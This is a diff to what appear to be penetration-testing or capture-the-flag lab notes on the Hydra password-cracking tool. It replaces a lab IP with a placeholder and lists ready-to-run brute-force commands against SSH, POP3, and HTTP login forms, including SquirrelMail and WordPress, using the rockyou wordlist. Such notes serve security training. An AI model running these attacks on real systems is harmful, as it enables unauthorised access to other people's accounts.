@@ -28,7 +28,7 @@ Hydra is a fairly straight forward tool to use, but we have to first understand 
 > -L <users> -P <passwords>
 
 ```sh
-sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt target.ip http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
 ```
 
 ```sh
@@ -39,8 +39,10 @@ hydra -l <username> -p <password> ssh://<ip>
 
 
 
-hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://target.ip -o hydra.ssh.jake
-hydra -l john -P /usr/share/wordlists/rockyou.txt target.ip -s 62337 http-post-form "/components/user/controller.php?action=authenticate:username=john&password=^PASS^:Incorrect Username or Password" -o hydra.http.john
-hydra -V -I -L usernames.txt -P log1.txt target.ip  http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect." -o hydra.http
-hydra -I -L usernames.txt -P passwords.txt pop3://target.ip -t 64 -o hydra.pop3
+- hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://target.ip -o hydra.ssh.jake
+- hydra -l john -P /usr/share/wordlists/rockyou.txt target.ip -s 62337 http-post-form "/components/user/controller.php?action=authenticate:username=john&password=^PASS^:Incorrect Username or Password" -o hydra.http.john
+- hydra -V -I -L usernames.txt -P log1.txt target.ip  http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect." -o hydra.http
+- hydra -I -L usernames.txt -P passwords.txt pop3://target.ip -t 64 -o hydra.pop3
+- hydra -L fsocity.dic.uniq -p password target.ip -t 64 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget.ip%2Fwp-admin%2F&testcookie=1:F=Invalid username"
+
 
